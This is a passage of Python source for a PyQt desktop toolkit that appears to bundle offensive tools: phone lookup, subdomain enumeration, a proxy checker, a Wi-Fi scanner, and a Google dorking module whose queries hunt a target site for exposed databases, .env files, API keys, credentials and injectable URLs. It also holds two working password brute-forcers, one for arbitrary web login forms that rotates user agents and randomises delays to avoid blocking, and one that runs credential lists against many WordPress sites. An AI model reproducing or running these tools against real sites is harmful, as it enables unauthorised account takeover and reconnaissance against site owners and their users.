    result = pyqtSignal(object)
    error = pyqtSignal(str)

class PhoneInfoWorker(QRunnable):
    def __init__(self, phone_number):
        super().__init__()
        self.phone_number = phone_number
        self.signals = WorkerSignals1()

    def run(self):
        try:
            parsed_number = phonenumbers.parse(self.phone_number)
            if phonenumbers.is_valid_number(parsed_number):
                result = self.get_phone_info(parsed_number)
                self.signals.result.emit(result)
            else:
                self.signals.error.emit("The phone number is not valid.")
        except Exception as e:
            self.signals.error.emit(str(e))

    def get_phone_info(self, number):
        return {
            "number": phonenumbers.format_number(number, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
            "country_code": number.country_code,
            "national_number": number.national_number,
            "region": geocoder.description_for_number(number, 'en'),
            "carrier": carrier.name_for_number(number, 'en'),
            "time_zones": timezone.time_zones_for_number(number),
            "is_valid": phonenumbers.is_valid_number(number),
            "is_possible": phonenumbers.is_possible_number(number),
            "number_type": self.get_number_type(phonenumbers.number_type(number)),
            "country": geocoder.country_name_for_number(number, 'en'),
            "area": geocoder.description_for_number(number, 'en'),
            "local_format": phonenumbers.format_number(number, phonenumbers.PhoneNumberFormat.NATIONAL),
            "international_format": phonenumbers.format_number(number, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
        }

    def get_number_type(self, type_code):
        types = {
            0: "FIXED_LINE",
            1: "MOBILE",
            2: "FIXED_LINE_OR_MOBILE",
            3: "TOLL_FREE",
            4: "PREMIUM_RATE",
            5: "SHARED_COST",
            6: "VOIP",
            7: "PERSONAL_NUMBER",
            8: "PAGER",
            9: "UAN",
            10: "UNKNOWN",
            27: "EMERGENCY",
            28: "VOICEMAIL",
            29: "SHORT_CODE",
            30: "STANDARD_RATE"
        }
        return types.get(type_code, "UNKNOWN")

class PhoneNumberAnalyzer(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.threadpool = QThreadPool()
        self.init_ui()

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Phone Number Searcher")
        self.setWindowIcon(QIcon('imgs/phone.png'))
        self.setFixedSize(600, 500)

        layout = QVBoxLayout()

        self.phone_entry = QLineEdit()
        self.phone_entry.setPlaceholderText("Enter phone number (with country code)")
        layout.addWidget(self.phone_entry)

        self.analyze_button = QPushButton("Search")
        self.analyze_button.clicked.connect(self.perform_analysis)
        layout.addWidget(self.analyze_button)

        search_options = QGroupBox("Search Options")
        search_layout = QVBoxLayout()

        self.options = {
            'number': QCheckBox("Show Formatted Number"),
            'country_code': QCheckBox("Show Country Code"),
            'national_number': QCheckBox("Show National Number"),
            'region': QCheckBox("Show Region"),
            'carrier': QCheckBox("Show Carrier"),
            'time_zones': QCheckBox("Show Time Zones"),
            'is_valid': QCheckBox("Show Validity"),
            'is_possible': QCheckBox("Show Possibility"),
            'number_type': QCheckBox("Show Number Type"),
            'country': QCheckBox("Show Country"),
            'area': QCheckBox("Show Area"),
            'local_format': QCheckBox("Show Local Format"),
            'international_format': QCheckBox("Show International Format"),
        }

        for option in self.options.values():
            option.setChecked(True)
            search_layout.addWidget(option)

        search_options.setLayout(search_layout)
        layout.addWidget(search_options)

        self.result_area = QTextEdit()
        self.result_area.setReadOnly(True)
        layout.addWidget(self.result_area)

        self.setLayout(layout)

    def perform_analysis(self):
        phone_number = self.phone_entry.text().strip()
        if not phone_number:
            QMessageBox.warning(self, "Input Error", "Please enter a valid phone number.")
            return

        self.analyze_button.setEnabled(False)
        self.result_area.clear()
        self.result_area.setText("Searching...")

        worker = PhoneInfoWorker(phone_number)
        worker.signals.result.connect(self.handle_result)
        worker.signals.error.connect(self.handle_error)
        self.threadpool.start(worker)

    def handle_result(self, info):
        formatted_info = self.format_response(info)
        self.result_area.setText(formatted_info)
        self.analyze_button.setEnabled(True)

    def handle_error(self, error):
        self.result_area.setText(f"An error occurred: {error}")
        self.analyze_button.setEnabled(True)

    def format_response(self, info):
        result = []
        for key, option in self.options.items():
            if option.isChecked() and key in info:
                value = info[key]
                if isinstance(value, list):
                    value = ', '.join(str(v) for v in value)
                elif isinstance(value, bool):
                    value = "Yes" if value else "No"
                result.append(f"{key.replace('_', ' ').title()}: {value}")
        return '\n'.join(result) if result else "No matching data found based on selected options."

class DorkingSearch(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Dorking Analyzer [BETA]")
        self.setWindowIcon(QIcon('imgs/dorking.png'))
        self.setFixedSize(800, 700)

        layout = QVBoxLayout()

        self.site_entry = QLineEdit()
        self.site_entry.setPlaceholderText("Enter target site (e.g., example.com)")
        layout.addWidget(self.site_entry)

        options_layout = QHBoxLayout()

        self.filetype_filter = QComboBox()
        self.filetype_filter.addItems(["Any", "pdf", "doc", "xls", "ppt", "txt"])
        options_layout.addWidget(QLabel("File type:"))
        options_layout.addWidget(self.filetype_filter)

        self.date_range = QComboBox()
        self.date_range.addItems(["Any time", "Past 24 hours", "Past week", "Past month", "Past year"])
        options_layout.addWidget(QLabel("Date:"))
        options_layout.addWidget(self.date_range)

        layout.addLayout(options_layout)

        scroll_area = QScrollArea()
        scroll_content = QWidget()
        scroll_layout = QGridLayout()

        self.dork_categories = {
    "Database files": 'inurl:".sql" OR inurl:".db" OR inurl:".mdb"',
    "Log files": 'filetype:log',
    "Directories": 'intitle:"Index of" OR intitle:"Directory Listing"',
    "Login pages": 'inurl:login OR inurl:signin OR inurl:admin',
    "Config files": 'filetype:conf OR filetype:config OR filetype:env',
    "Backup files": 'filetype:bak OR filetype:backup OR filetype:old',
    "Admin panels": 'inurl:admin OR inurl:administrator OR inurl:wp-admin',
    "Server status": 'intitle:"Apache Status" OR intitle:"nginx status"',
    "PHP info": 'intitle:"phpinfo()" OR inurl:phpinfo.php',
    "SQL errors": 'intext:"SQL syntax error" OR intext:"mysql_fetch_array()"',
    "Apache errors": 'intext:"Apache/2." OR intext:"Apache Server at"',
    "FTP logins": 'inurl:"ftp://" AND intext:"login" AND intext:"password"',
    "Webcams": 'inurl:ViewerFrame?Mode=',
    "Network devices": 'intitle:"RouterOS" OR inurl:"/level/15/exec/-/show"',
    "Vulnerable software": 'intext:"Powered by" AND (intext:phpBB OR intext:WordPress)',
    "Open ports": 'intitle:"Welcome to nginx!" OR intitle:"Welcome to LiteSpeed"',
    "Sensitive documents": 'filetype:pdf AND (intext:confidential OR intext:password)',
    "API keys": 'intext:"api_key" OR intext:"api_secret"',
    "Exposed git": 'inurl:".git" OR inurl:".gitignore"',
    "WordPress files": 'inurl:wp-content OR inurl:wp-includes',
    "Joomla files": 'inurl:index.php?option=com_',
    "Drupal files": 'inurl:node/add OR inurl:node/*/edit',
    "Magento files": 'inurl:index.php/admin OR inurl:magento_version',
    "phpMyAdmin": 'intitle:"phpMyAdmin" AND intext:"Welcome to phpMyAdmin"',
    "cPanel": 'inurl:":2082" OR inurl:":2083"',
    "Webmin": 'inurl:":10000" AND intext:"Webmin"',
    "RDP access": 'inurl:":3389" OR intext:"Remote Desktop Protocol"',
    "VNC access": 'inurl:":5900" OR intext:"VNC server"',
    "SMTP servers": 'intext:"220" AND intext:"SMTP"',
    "DNS information": 'intitle:"Welcome to Bind" OR intext:"Bind9 DNS"',
    "Subdomains": 'site:*.example.com -www',
    "Open redirects": 'inurl:redir OR inurl:redirect OR inurl:return OR inurl:url',
    "XSS vulnerabilities": 'inurl:search OR inurl:query AND intext:"<script>"',
    "SQL injection": 'inurl:id= OR inurl:pid= OR inurl:category=',
    "LFI vulnerabilities": 'inurl:include OR inurl:require OR inurl:load',
    "RFI vulnerabilities": 'inurl:=http OR inurl:=ftp OR inurl:=https',
    "IDOR vulnerabilities": 'inurl:user_id= OR inurl:order= OR inurl:account=',
    "CSRF vulnerabilities": 'intext:"csrf_token" OR intext:"authenticity_token"',
    "JWT tokens": 'intext:"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"',
    "Exposed credentials": 'intext:username AND intext:password AND inurl:auth',
    "SSH configurations": 'intitle:index of /etc/ssh'  
}

        self.category_checkboxes = {}
        self.select_all_checkbox = QCheckBox("Select All (click)")
        self.select_all_checkbox.setChecked(True)
        self.select_all_checkbox.stateChanged.connect(self.toggle_all)

        scroll_layout.addWidget(self.select_all_checkbox, 0, 0, 1, 4)

        for i, (category, dork) in enumerate(self.dork_categories.items()):
            checkbox = QCheckBox(category)
            checkbox.setChecked(True)
            self.category_checkboxes[category] = checkbox
            scroll_layout.addWidget(checkbox, (i // 4) + 1, i % 4)

        scroll_content.setLayout(scroll_layout)
        scroll_area.setWidget(scroll_content)
        scroll_area.setWidgetResizable(True)
        layout.addWidget(scroll_area)

        self.search_button = QPushButton("Search")
        self.search_button.clicked.connect(self.perform_search)
        layout.addWidget(self.search_button)

        self.results_area = QTextEdit()
        self.results_area.setReadOnly(True)
        layout.addWidget(self.results_area)

        self.setLayout(layout)

    def toggle_all(self, state):
        checked = (state == Qt.Checked)
        for checkbox in self.category_checkboxes.values():
            checkbox.setChecked(checked)

    def perform_search(self):
        site = self.site_entry.text().strip()
        if not site:
            QMessageBox.warning(self, "Input Error", "Please enter a target site.")
            return

        filetype = self.filetype_filter.currentText()
        date_range = self.date_range.currentText()

        self.results_area.clear()
        self.results_area.append("Searches have been opened in new tabs:")

        for category, checkbox in self.category_checkboxes.items():
            if checkbox.isChecked():
                dork = f'site:{site} {self.dork_categories[category]}'
                if filetype != "Any":
                    dork += f' filetype:{filetype}'
                if date_range != "Any time":
                    dork += f' {date_range.lower()}'
                
                search_url = f"https://www.google.com/search?q={dork}"
                webbrowser.open_new_tab(search_url)
                self.results_area.append(f"• {category}: {dork}")

        self.results_area.append("\nPlease check your browser for the opened tabs.")

class EnumerationThread(QThread):
    update_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(list)

    def __init__(self, domain, subdomains, max_threads):
        super().__init__()
        self.domain = domain
        self.subdomains = subdomains
        self.max_threads = max_threads

    def run(self):
        found_subdomains = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_subdomain = {executor.submit(self.check_subdomain, subdomain): subdomain for subdomain in self.subdomains}
            for future in concurrent.futures.as_completed(future_to_subdomain):
                subdomain = future_to_subdomain[future]
                try:
                    result = future.result()
                    if result:
                        found_subdomains.append(result)
                        self.update_signal.emit(result)
                except Exception as exc:
                    print(f'{subdomain} generated an exception: {exc}')
        self.finished_signal.emit(found_subdomains)

    def check_subdomain(self, subdomain):
        full_domain = f"{subdomain}.{self.domain}"
        try:
            dns.resolver.resolve(full_domain, 'A')
            return full_domain
        except dns.resolver.NXDOMAIN:
            return None
        except Exception as e:
            print(f"Error resolving {full_domain}: {str(e)}")
            return None

class SubdomainEnumerator(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Subdomain Enumerator")
        self.setWindowIcon(QIcon('imgs/subdomain.png'))
        self.setFixedSize(600, 600)

        layout = QVBoxLayout()

        self.domain_entry = QLineEdit()
        self.domain_entry.setPlaceholderText("Enter main domain (e.g., example.com)")
        layout.addWidget(self.domain_entry)

        self.custom_subdomains_entry = QLineEdit()
        self.custom_subdomains_entry.setPlaceholderText("Enter custom subdomains (comma-separated)")
        layout.addWidget(self.custom_subdomains_entry)
        self.use_common_subdomains = QCheckBox("Use common subdomains")
        self.use_common_subdomains.setChecked(True)
        layout.addWidget(self.use_common_subdomains)

        thread_layout = QHBoxLayout()
        thread_layout.addWidget(QLabel("Max Threads:"))
        self.thread_count = QSpinBox()
        self.thread_count.setRange(1, 100)
        self.thread_count.setValue(10)
        thread_layout.addWidget(self.thread_count)
        layout.addLayout(thread_layout)
        self.enumerate_button = QPushButton("Enumerate Subdomains")
        self.enumerate_button.clicked.connect(self.enumerate_subdomains)
        layout.addWidget(self.enumerate_button)

        self.results_area = QTextEdit()
        self.results_area.setReadOnly(True)
        layout.addWidget(self.results_area)

        self.setLayout(layout)

    def enumerate_subdomains(self):
        domain = self.domain_entry.text().strip()
        if not domain:
            QMessageBox.warning(self, "Input Error", "Please enter a domain.")
            return

        subdomains = []
        if self.use_common_subdomains.isChecked():
            subdomains.extend(['www', 'mail', 'ftp', 'ns1', 'ns2', 'blog', 'webmail', 'dev', 'test', 'shop', 'api', 'admin'])

        custom_subdomains = self.custom_subdomains_entry.text().strip()
        if custom_subdomains:
            subdomains.extend([s.strip() for s in custom_subdomains.split(',')])

        if not subdomains:
            QMessageBox.warning(self, "Input Error", "Please enter custom subdomains or use common subdomains.")
            return

        self.results_area.clear()
        self.enumerate_button.setEnabled(False)

        self.enumeration_thread = EnumerationThread(domain, subdomains, self.thread_count.value())
        self.enumeration_thread.update_signal.connect(self.update_results)
        self.enumeration_thread.finished_signal.connect(self.enumeration_finished)
        self.enumeration_thread.start()

    def update_results(self, subdomain):
        self.results_area.append(subdomain)

    def enumeration_finished(self, found_subdomains):
        self.enumerate_button.setEnabled(True)
        if not found_subdomains:
            self.results_area.append("No subdomains found.")
        else:
            self.results_area.append(f"\nTotal subdomains found: {len(found_subdomains)}")


class BruteforceThread(QThread):
    update_signal = pyqtSignal(str)
    finished_signal = pyqtSignal()

    def __init__(self, url, username_field, password_field, username, wordlist, delay_min, delay_max, use_user_agents):
        super().__init__()
        self.url = url
        self.username_field = username_field
        self.password_field = password_field
        self.username = username
        self.wordlist = wordlist
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.use_user_agents = use_user_agents
        self.is_running = True

    def run(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0', 
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8'
        ]

        for password in self.wordlist:
            if not self.is_running:
                break
            
            time.sleep(random.uniform(self.delay_min, self.delay_max))
            headers = {'User-Agent': random.choice(user_agents)} if self.use_user_agents else {}
            
            try:
                response = requests.post(self.url, 
                                         data={self.username_field: self.username, self.password_field: password}, 
                                         headers=headers, 
                                         allow_redirects=False)
                
                if response.status_code == 302 or ("success" in response.text.lower() and "invalid" not in response.text.lower()):
                    self.update_signal.emit(f"[SUCCESS] Password found: {password}")
                    break
                elif response.status_code == 403:
                    self.update_signal.emit("[BLOCKED] Request blocked by server. Exiting.")
                    break
                else:
                    self.update_signal.emit(f"[FAILED] Tried password: {password}")

            except Exception as e:
                self.update_signal.emit(f"[ERROR] An error occurred: {str(e)}")
                break

        self.finished_signal.emit()

    def stop(self):
        self.is_running = False

class WebFormBruteforcer(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()
        self.bruteforce_thread = None

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Web Form Bruteforcer [BETA]")
        self.setWindowIcon(QIcon('imgs/bruteforce.png'))
        self.setMinimumSize(700, 500)

        main_layout = QVBoxLayout()

        form_group = QGroupBox("Form Configuration")
        form_layout = QFormLayout()
        
        self.url_entry = QLineEdit()
        form_layout.addRow("URL:", self.url_entry)
        
        self.username_field_entry = QLineEdit()
        form_layout.addRow("Username field:", self.username_field_entry)
        
        self.password_field_entry = QLineEdit()
        form_layout.addRow("Password field:", self.password_field_entry)
        
        self.username_entry = QLineEdit()
        form_layout.addRow("Username:", self.username_entry)
        
        form_group.setLayout(form_layout)
        main_layout.addWidget(form_group)
        options_layout = QHBoxLayout()
        
        wordlist_group = QGroupBox("Wordlist")
        wordlist_layout = QVBoxLayout()
        self.load_wordlist_button = QPushButton("Load Password Wordlist")
        self.load_wordlist_button.clicked.connect(self.load_wordlist)
        self.wordlist_label = QLabel("No wordlist loaded")
        wordlist_layout.addWidget(self.load_wordlist_button)
        wordlist_layout.addWidget(self.wordlist_label)
        wordlist_group.setLayout(wordlist_layout)
        options_layout.addWidget(wordlist_group)

        settings_group = QGroupBox("Settings")
        settings_layout = QFormLayout()
        self.delay_min = QSpinBox()
        self.delay_min.setRange(0, 10)
        self.delay_min.setValue(1)
        self.delay_max = QSpinBox()
        self.delay_max.setRange(1, 20)
        self.delay_max.setValue(3)
        self.use_user_agents = QCheckBox()
        self.use_user_agents.setChecked(True)
        settings_layout.addRow("Min delay (s):", self.delay_min)
        settings_layout.addRow("Max delay (s):", self.delay_max)
        settings_layout.addRow("Use User Agents:", self.use_user_agents)
        settings_group.setLayout(settings_layout)
        options_layout.addWidget(settings_group)

        main_layout.addLayout(options_layout)

        self.results_area = QTextEdit()
        self.results_area.setReadOnly(True)
        main_layout.addWidget(self.results_area)
        button_layout = QHBoxLayout()
        self.start_button = QPushButton("Start Bruteforcing")
        self.start_button.clicked.connect(self.start_bruteforce)
        self.stop_button = QPushButton("Stop")
        self.stop_button.clicked.connect(self.stop_bruteforce)
        self.stop_button.setEnabled(False)
        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.stop_button)
        main_layout.addLayout(button_layout)

        self.setLayout(main_layout)
        self.wordlist = []

    def load_wordlist(self):
        options = QFileDialog.Options()
        file_name, _ = QFileDialog.getOpenFileName(self, "Open Wordlist File", "", "Text Files (*.txt);;All Files (*)", options=options)
        if file_name:
            try:
                with open(file_name, 'r') as file:
                    self.wordlist = file.read().splitlines()
                self.wordlist_label.setText(f"Wordlist loaded: {len(self.wordlist)} entries")
                QMessageBox.information(self, "Wordlist Loaded", f"Wordlist loaded with {len(self.wordlist)} entries.")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Could not load wordlist: {str(e)}")

    def start_bruteforce(self):
        url = self.url_entry.text().strip()
        username_field = self.username_field_entry.text().strip()
        password_field = self.password_field_entry.text().strip()
        username = self.username_entry.text().strip()

        if not all([url, username_field, password_field, username, self.wordlist]):
            QMessageBox.warning(self, "Input Error", "Please fill in all fields and load a wordlist.")
            return

        self.results_area.clear()
        self.results_area.append(f"Starting bruteforce on {url} with username {username}...\n")

        self.bruteforce_thread = BruteforceThread(
            url, username_field, password_field, username, self.wordlist,
            self.delay_min.value(), self.delay_max.value(), self.use_user_agents.isChecked()
        )
        self.bruteforce_thread.update_signal.connect(self.update_results)
        self.bruteforce_thread.finished_signal.connect(self.bruteforce_finished)
        self.bruteforce_thread.start()

        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

    def stop_bruteforce(self):
        if self.bruteforce_thread and self.bruteforce_thread.isRunning():
            self.bruteforce_thread.stop()
            self.bruteforce_thread.wait()
        self.bruteforce_finished()

    def update_results(self, message):
        self.results_area.append(message)

    def bruteforce_finished(self):
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.results_area.append("Bruteforcing completed.\n")
        
class WordpressCheckerWorker(QThread):
    log = pyqtSignal(str)
    progress = pyqtSignal(int)
    check_finished = pyqtSignal()

    def __init__(self, sites, usernames, passwords, delay=0):
        super().__init__()
        self.sites = sites
        self.usernames = usernames
        self.passwords = passwords
        self.delay = delay
        self.is_running = True

    def run(self):
        total = len(self.sites) * len(self.usernames) * len(self.passwords)
        count = 0
        for site in self.sites:
            if not self.is_running:
                break
            login_url = f"{site}/wp-login.php"
            for username in self.usernames:
                for password in self.passwords:
                    if not self.is_running:
                        break
                    try:
                        data = {
                            'log': username,
                            'pwd': password,
                            'wp-submit': 'Log In',
                            'redirect_to': f"{site}/wp-admin/",
                            'testcookie': '1'
                        }
                        response = requests.post(login_url, data=data, timeout=10)

                        if "wp-admin" in response.url:
                            self.log.emit(f"Success: {site} - Username: {username}, Password: {password}")
                        else:
                            self.log.emit(f"Failed: {site} - Username: {username}, Password: {password}")
                        time.sleep(self.delay)
                    except Exception as e:
                        self.log.emit(f"Error: {site} - {str(e)}")
                    count += 1
                    self.progress.emit(int(count / total * 100))
        self.check_finished.emit()

    def stop(self):
        self.is_running = False

class WordpressChecker(QDialog):
    default_passwords = [
        '123456', 'password', '123456789', 'qwerty', 'abc123',
        'password1', '12345678', 'qwerty123', '1234567',
        'password123', 'welcome', 'admin', 'letmein', '123123', '123321'
    ]

    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("WordPress BruteForce")
        self.setWindowIcon(QIcon('imgs/wordcheck.png'))
        self.setFixedSize(700, 600)
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()
        layout.addWidget(QLabel("WordPress Sites (one per line):"))
        self.servers_entry = QTextEdit()
        self.servers_entry.setPlaceholderText("http://example.com\nhttp://test.com\nhttp://another.com")
        layout.addWidget(self.servers_entry)
        hbox = QHBoxLayout()
        vbox_usernames = QVBoxLayout()
        vbox_passwords = QVBoxLayout()

        vbox_usernames.addWidget(QLabel("Usernames (one per line):"))
        self.usernames_entry = QTextEdit()
        self.usernames_entry.setPlaceholderText("admin\nuser\nmanager")
        vbox_usernames.addWidget(self.usernames_entry)

        vbox_passwords.addWidget(QLabel("Passwords (one per line):"))
        self.passwords_entry = QTextEdit()
        self.passwords_entry.setPlaceholderText("password\n123456\nqwerty")
        vbox_passwords.addWidget(self.passwords_entry)

        hbox.addLayout(vbox_usernames)
        hbox.addLayout(vbox_passwords)
        layout.addLayout(hbox)
        delay_layout = QHBoxLayout()
        delay_layout.addWidget(QLabel("Delay between requests (seconds):"))
        self.delay_spinbox = QSpinBox()
        self.delay_spinbox.setMinimum(0)
        self.delay_spinbox.setMaximum(60)
        delay_layout.addWidget(self.delay_spinbox)
        delay_layout.addStretch()
        layout.addLayout(delay_layout)

        button_layout = QHBoxLayout()
        self.check_button = QPushButton("Start BruteForce Check")
        self.check_button.clicked.connect(self.start_checking)
        button_layout.addWidget(self.check_button)

        self.stop_button = QPushButton("Stop")
        self.stop_button.clicked.connect(self.stop_checking)
        self.stop_button.setEnabled(False)
        button_layout.addWidget(self.stop_button)

        self.clear_button = QPushButton("Clear Results")
        self.clear_button.clicked.connect(self.clear_results)
        button_layout.addWidget(self.clear_button)
        layout.addLayout(button_layout)
        self.progress_bar = QProgressBar()
        layout.addWidget(self.progress_bar)

        layout.addWidget(QLabel("Results:"))
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)

        self.setLayout(layout)

    def start_checking(self):
        sites = [line.strip() for line in self.servers_entry.toPlainText().split('\n') if line.strip()]
        usernames = [line.strip() for line in self.usernames_entry.toPlainText().split('\n') if line.strip()]
        passwords = [line.strip() for line in self.passwords_entry.toPlainText().split('\n') if line.strip()]
        delay = self.delay_spinbox.value()

        if not sites or not usernames or not passwords:
            QMessageBox.warning(self, "Input Error", "Please enter at least one site, username, and password.")
            return

        self.result_text.clear()
        self.check_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.progress_bar.setValue(0)

        self.worker = WordpressCheckerWorker(sites, usernames, passwords, delay)
        self.worker.log.connect(self.handle_log)
        self.worker.progress.connect(self.update_progress)
        self.worker.check_finished.connect(self.handle_check_finished)
        self.worker.start()

    def stop_checking(self):
        if hasattr(self, 'worker'):
            self.worker.stop()
        self.stop_button.setEnabled(False)

    def clear_results(self):
        self.result_text.clear()

    def handle_log(self, log_entry):
        self.result_text.append(log_entry)

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def handle_check_finished(self):
        self.check_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.result_text.append("All WordPress sites checked for default passwords.")


# Тестовый класс
class idk:
    def __init__(self):
        self.app_name = "SOON"

    def launch_app(self):
        try:
            app_dir = os.path.abspath('apps/soon')
            app_path = os.path.join(app_dir, self.app_name)
            
            if not os.path.exists(app_path):
                raise FileNotFoundError(f"File not found: {app_path}")
            
            app_path = os.path.normpath(app_path)

            if sys.platform == 'win32':
                subprocess.run(['explorer', '/select,', app_path], check=True)
            
            print(f"Application '{self.app_name}' is in the directory and the file is highlighted.")

        except FileNotFoundError as e:
            print(f"Error: {e}")
        except subprocess.CalledProcessError as e:
            print(f"Error opening explorer: {e.returncode}")
        except Exception as e:
            print(f"Error launching application: {e}")

class ProxyChecker(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Proxy Checker")
        self.setWindowIcon(QIcon('imgs/proxy_checker.png'))
        self.setFixedSize(600, 500)

        layout = QVBoxLayout()
        self.proxy_entry = QLineEdit()
        self.proxy_entry.setPlaceholderText("Enter proxies (format: IP:PORT, one per line)")
        layout.addWidget(self.proxy_entry)
        self.load_proxies_button = QPushButton("Load Proxy List")
        self.load_proxies_button.clicked.connect(self.load_proxies)
        layout.addWidget(self.load_proxies_button)
        self.protocol_label = QLineEdit("Select Protocol:")
        self.protocol_label.setReadOnly(True)
        layout.addWidget(self.protocol_label)
        self.protocol_combo = QComboBox()
        self.protocol_combo.addItems(["HTTP", "HTTPS", "SOCKS5"])
        layout.addWidget(self.protocol_combo)

        timeout_layout = QHBoxLayout()
        self.timeout_label = QLineEdit("Set Timeout (seconds):")
        self.timeout_label.setReadOnly(True)
        timeout_layout.addWidget(self.timeout_label)
        self.timeout_spinbox = QSpinBox()
        self.timeout_spinbox.setMinimum(1)
        self.timeout_spinbox.setMaximum(60)
        self.timeout_spinbox.setValue(5)
        timeout_layout.addWidget(self.timeout_spinbox)
        layout.addLayout(timeout_layout)

        self.results_area = QTextEdit()
        self.results_area.setReadOnly(True)
        layout.addWidget(self.results_area)
        self.start_button = QPushButton("Start Checking")
        self.start_button.clicked.connect(self.start_checking)
        layout.addWidget(self.start_button)

        self.save_results_button = QPushButton("Save Results")
        self.save_results_button.clicked.connect(self.save_results)
        layout.addWidget(self.save_results_button)

        self.setLayout(layout)
        self.proxies = []

    def load_proxies(self):
        options = QFileDialog.Options()
        file_name, _ = QFileDialog.getOpenFileName(self, "Open Proxy File", "", "Text Files (*.txt);;All Files (*)", options=options)
        if file_name:
            try:
                with open(file_name, 'r') as file:
                    self.proxies = file.read().splitlines()
                QMessageBox.information(self, "Proxies Loaded", f"Loaded {len(self.proxies)} proxies.")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Could not load proxies: {str(e)}")

    def start_checking(self):
        if not self.proxies:
            QMessageBox.warning(self, "Input Error", "Please load a list of proxies.")
            return

        protocol = self.protocol_combo.currentText().lower()
        timeout = self.timeout_spinbox.value()

        self.results_area.append("Starting proxy checks...\n")
        for proxy in self.proxies:
            proxy = proxy.strip()
            if not proxy:
                continue

            proxy_dict = {protocol: f"{protocol}://{proxy}"}
            try:
                response = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=timeout)
                if response.status_code == 200:
                    self.results_area.append(f"[VALID] Proxy {proxy} is working. Response: {response.json()}")
                else:
                    self.results_area.append(f"[INVALID] Proxy {proxy} returned status code {response.status_code}.")
            except requests.RequestException as e:
                self.results_area.append(f"[INVALID] Proxy {proxy} failed: {str(e)}")

        self.results_area.append("Proxy checking completed.\n")

    def save_results(self):
        options = QFileDialog.Options()
        file_name, _ = QFileDialog.getSaveFileName(self, "Save Results", "", "Text Files (*.txt);;All Files (*)", options=options)
        if file_name:
            try:
                with open(file_name, 'w') as file:
                    file.write(self.results_area.toPlainText())
                QMessageBox.information(self, "Results Saved", "Results were successfully saved.")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Could not save results: {str(e)}")
                
                
class WiFiScanThread(QThread):
    scan_result_signal = pyqtSignal(list)
    progress_signal = pyqtSignal(int)
    
    def __init__(self, scan_interval, channel, band):
        super().__init__()
        self.is_running = True
        self.scan_interval = scan_interval
        self.channel = channel
        self.band = band

    def stop(self):
        self.is_running = False

    def run(self):
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]

        while self.is_running:
            iface.scan()
            self.progress_signal.emit(0)
            time.sleep(2)

            for i in range(1, 11):
                if not self.is_running:
                    return
                time.sleep(self.scan_interval / 10)
                self.progress_signal.emit(i * 10)

            scan_results = iface.scan_results()
            wifi_networks = []
            for network in scan_results:
                if (self.channel == 0 or network.freq == self.channel) and \
                   (self.band == "All" or 
                    (self.band == "2.4 GHz" and 2400 <= network.freq <= 2500) or 
                    (self.band == "5 GHz" and 5000 <= network.freq <= 6000)):
                    wifi_networks.append((
                        network.ssid,
                        network.signal,
                        network.freq / 1000,
                        network.akm[0] if network.akm else "Open",
                        network.cipher[0] if network.cipher else "None",
                        network.bssid,
                        self.freq_to_channel(network.freq)
                    ))

            self.scan_result_signal.emit(wifi_networks)
            self.progress_signal.emit(100)

    def freq_to_channel(self, freq):
        if 2412 <= freq <= 2484:
            return (freq - 2412) // 5 + 1
        elif 5170 <= freq <= 5825:
            return (freq - 5170) // 5 + 34
        else:
            return 0  

class WiFiAnalyzer(QDialog):
    def __init__(self):
        super().__init__()
        self.scan_thread = None
        self.scan_interval = 5
        self.channel = 0
        self.band = "All"
        self.network_history = {}
        self.init_ui()

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Wi-Fi Analyzer")
        self.setWindowIcon(QIcon('imgs/wifi.png'))
        self.setMinimumSize(1000, 800)

        main_layout = QVBoxLayout()
        self.tabs = QTabWidget()
        self.tabs.addTab(self.create_scan_tab(), "Scan")
        self.tabs.addTab(self.create_graph_tab(), "Graphs")
        self.tabs.addTab(self.create_settings_tab(), "Settings")
        main_layout.addWidget(self.tabs)

        self.setLayout(main_layout)
        self.graph_timer = QTimer(self)
